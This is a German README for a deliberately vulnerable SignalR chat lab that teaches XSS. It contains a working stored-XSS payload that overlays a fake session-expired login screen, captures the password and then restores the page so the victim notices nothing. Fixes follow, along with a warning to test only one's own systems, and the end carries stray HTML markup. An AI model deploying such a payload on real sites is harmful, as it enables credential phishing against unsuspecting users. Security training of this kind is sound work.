# 🛡️ SignalR XSS & Security Lab

Dieses Projekt ist eine absichtlich unsichere Chat-Anwendung. Sie dient als **Lernumgebung**, um Sicherheitslücken wie Cross-Site Scripting (XSS) und die Risiken von LocalStorage-basierten JWTs zu verstehen und zu beheben.

## 🚀 Features
* Echtzeit-Chat mit **SignalR** und ASP.NET Core.
* Dynamisches Pastell-Design basierend auf dem Benutzernamen.
* **Absichtliche Schwachstellen:** Demonstriert XSS durch die Verwendung von `innerHTML`.
* **Dynamische Endpunkte:** Das Frontend nutzt relative Pfade, sodass kein Hardcoding von Ports nötig ist.

## 🛠️ Installation & Start

1.  **Backend:**
    * Öffne den Ordner `SignalRChatServer` in Visual Studio oder VS Code.
    * Starte das Projekt mit `dotnet run`. Der Server läuft standardmäßig auf `http://localhost:5001`.

2.  **Frontend:**
    * Da die Dateien im `wwwroot`-Ordner des Servers liegen, öffne einfach `http://localhost:5001/index.html` in deinem Browser.
    * Gib einen Namen ein und beginne zu chatten.

---

## ☣️ Das "In-Place Phishing" Experiment

Dieses Tutorial zeigt, wie ein Angreifer die komplette Kontrolle über das User-Interface übernehmen kann, ohne dass die URL in der Adresszeile sich ändert.

### Der Angriff:
Kopiere diesen Payload in das Chat-Eingabefeld. Er simuliert eine abgelaufene Sitzung, greift das Passwort ab und stellt danach den Chat-Zustand wieder her, damit das Opfer keinen Verdacht schöpft.

```html
<img src=x onerror="
    /* 1. Aktuellen Zustand der Seite speichern */
    const originalContent = document.body.innerHTML;

    /* 2. Den Phishing-Bildschirm erstellen */
    document.body.innerHTML = `
        <div id='phish' style='position:fixed;top:0;left:0;width:100%;height:100%;background:#f0f2f5;z-index:9999;display:flex;align-items:center;justify-content:center;font-family:Arial;'>
            <div style='background:white;padding:40px;border-radius:15px;box-shadow:0 4px 20px rgba(0,0,0,0.2);text-align:center;width:350px;'>
                <h2 style='color:#1e90ff;margin-bottom:20px;'>Sitzung abgelaufen</h2>
                <p style='color:#666;margin-bottom:20px;'>Bitte geben Sie Ihr Passwort erneut ein, um fortzufahren.</p>
                <input type='password' id='p' placeholder='Passwort' style='width:100%;padding:12px;margin-bottom:20px;border:2px solid #ddd;border-radius:25px;'>
                <button id='btn' style='background:#1e90ff;color:white;border:none;padding:12px 30px;border-radius:25px;cursor:pointer;width:100%;'>Anmelden</button>
            </div>
        </div>`;

    /* 3. Event-Listener für den Button */
    document.getElementById('btn').onclick = function() {
        const pass = document.getElementById('p').value;
        
        /* 4. Passwort 'stehlen' (Demo-Zwecke) */
        alert('ANGREIFER HAT DAS PASSWORT: ' + pass);
        
        /* 5. Alles wieder auf Anfang setzen - der User merkt nichts */
        document.body.innerHTML = originalContent;
        
        /* 6. Seite neu laden, um Scripte/Verbindungen zu reaktivieren */
        location.reload(); 
    };
">
```

### 🔄 Notfall-Reset via Swagger

Sollte ein Angriff die Website komplett unbrauchbar gemacht haben, kannst du das System jederzeit zurücksetzen. Da die Nachrichten direkt aus der Datenbank gerendert werden, löscht ein Reset der DB-Einträge auch den bösartigen Code:

1.  Navigiere zu http://localhost:5001/swagger.
    
2.  Suche den **DELETE** Endpoint unter /messages.
    
3.  Klicke auf **Try it out** und dann auf **Execute**.
    
4.  Lade den Chat neu – alle injizierten Skripte sind nun entfernt.
    

🔒 Wie man es richtig macht (The Fix)
-------------------------------------

In einer produktiven App sollten folgende Punkte umgesetzt werden:

1.  **Kein innerHTML:** Verwende in script.js konsequent .textContent statt .innerHTML. Dies verhindert, dass der Browser User-Input als Code ausführt.
    
2.  **HttpOnly Cookies:** Speichere JWTs niemals im localStorage. Nutze HttpOnly Cookies, damit JavaScript keinen Zugriff auf die Session-Token hat.
    
3.  **CSP (Content Security Policy):** Implementiere einen CSP-Header, der Inline-Skripte (onerror, ) blockiert.</div></li><li class="slate-li"><div style="position:relative"><strong class="slate-bold">Backend Sanitization:</strong> Nutze Bibliotheken wie Ganss.XSS im Backend, um eingehende Nachrichten zu filtern, bevor sie gespeichert werden.</div></li></ol><p class="slate-paragraph"><strong class="slate-bold">Warnung:</strong> Dieses Projekt dient nur zu Bildungszwecken. Führe diese Angriffe niemals auf Systemen aus, die dir nicht gehören.</p><p class="slate-paragraph"></p></x-turndown>
